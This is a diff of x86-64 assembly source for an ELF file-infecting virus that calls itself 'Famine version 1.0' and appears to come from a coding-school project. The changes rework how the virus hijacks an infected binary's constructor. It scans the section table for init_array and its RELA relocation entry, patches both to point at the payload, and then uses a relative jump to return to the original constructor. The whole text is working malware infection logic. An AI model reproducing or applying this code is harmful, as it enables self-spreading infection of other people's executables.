@@ -32,7 +32,7 @@ _start:
     syscall
     leave
     pop     rbx
-    jmp     [rel init_ptr]
+    jmp     _end - 5
 
 ; [rsp]         fd
 ; [rsp + 0x4]   buf_len
@@ -196,35 +196,63 @@ next_phdr:
     cmp     r10, r9
     jl      loop_phdrs
 
-loop_sections:
-    mov     rax, [rsp + map]
-    mov     rbx, [rax + e_shoff]
-    add     rbx, rax
+loop_sections:  ; We loop from the end of the section table to get 
+                ; the init_array content before reaching the rela.dyn section
+    mov     rbx, [rsp + map]
+    movzx   rax, WORD [rbx + e_shnum]
+    movzx   rcx, WORD [rbx + e_shentsize]
+    mul     rcx
+    add     rax, [rbx + e_shoff]
+    add     rax, rbx
     mov     rdx, [rsp + text_phdr]
     mov     rdx, [rdx + p_offset]
     add     rdx, QWORD [rsp + old_text_size]
-    xor     r8, r8
+    mov     cx, WORD [rbx + e_shnum]
 
 test_last_text:
-    mov     r9, QWORD [rbx + sh_offset]
-    add     r9, QWORD [rbx + sh_size]
+    sub     ax, WORD [rbx + e_shentsize]
+    mov     r9, QWORD [rax + sh_offset]
+    add     r9, QWORD [rax + sh_size]
     cmp     r9, rdx
     jne     test_init_array
-    mov     QWORD [rsp + last_text_shdr], rbx
+    mov     QWORD [rsp + last_text_shdr], rax
 test_init_array:
-    mov     r9d, [rbx + sh_type]
+    mov     r9d, [rax + sh_type]
     cmp     r9d, SHT_INIT_ARRAY
     jne     test_bss
-    mov     QWORD [rsp + init_array_shdr], rbx
+    mov     QWORD [rsp + init_array_shdr], rax
 test_bss:
     cmp     r9d, SHT_NOBITS
-    jne     next_section
-    mov     QWORD [rsp + bss_shdr], rbx
+    jne     test_rela
+    mov     QWORD [rsp + bss_shdr], rax
+test_rela:
+    cmp     r9d, SHT_RELA
+    je      get_init_rela
 next_section:
-    inc     r8
-    add     bx, [rax + e_shentsize]
-    cmp     r8w, [rax + e_shnum]
-    jle     test_last_text
+    loop    test_last_text
+    jmp     check_text_padding
+
+get_init_rela:
+    mov     r8, [rsp + map]
+    mov     r10, [rsp + init_array_shdr]
+    add     r8, [r10 + sh_offset]
+    mov     r8, [r8]
+    mov     QWORD [rsp + old_init_func], r8
+    mov     r10, [r10 + sh_addr]
+    mov     r11, [rsp + map]
+    add     r11, [rax + sh_offset]
+    mov     r12, r11
+    add     r12, [rax + sh_size]
+loop_rela:
+    cmp     r10, [r11 + r_offset]
+    je      found_init_rela
+    add     r11, RELA_SIZE
+    cmp     r11, r12
+    jl      loop_rela
+    jmp     next_section
+found_init_rela:
+    mov     [rsp + init_rela_entry], r11
+    jmp     next_section
 
 check_text_padding:
     mov     r8, [rsp + text_phdr]
@@ -270,14 +298,17 @@ hijack_constructor:
     mov     rax, [rsp + map]
     mov     rbx, [rsp + init_array_shdr]
     add     rax, [rbx + sh_offset]
-    mov     rdx, [rax]
-    mov     QWORD [rsp + old_init_func], rdx
     mov     rdx, [rsp + payload_base_address]
     mov     [rax], rdx
+    mov     [r11 + r_addend], rdx
     mov     rax, [rsp + payload_base_offset]
-    add     rax, virus_len - 8 ; let's override init_ptr with the old_init_ptr
+    add     rax, virus_len - 4 ; let's override init_ptr with the old_init_ptr
     mov     rdx, [rsp + old_init_func]
-    mov     [rax], rdx
+    mov     rbx, rax
+    add     bl, 4
+    sub     rbx, [rsp + map]
+    sub     rdx, rbx
+    mov     DWORD [rax], edx
 
 munmap_quit_infect:
     mov     rdi, [rsp + map]
@@ -304,7 +335,7 @@ quit_infect:
     signature: db "Famine version 1.0 (c)oded by alagroy-", 0
     data_tmp_text: db "Remapping and infecting .data", 10
         .len: equ $ - data_tmp_text
-    init_ptr: dq _end
+    final_jump: db 0xe9, 0, 0, 0, 0
 _end:
     xor     rdi, rdi
     mov     eax, SYS_EXIT
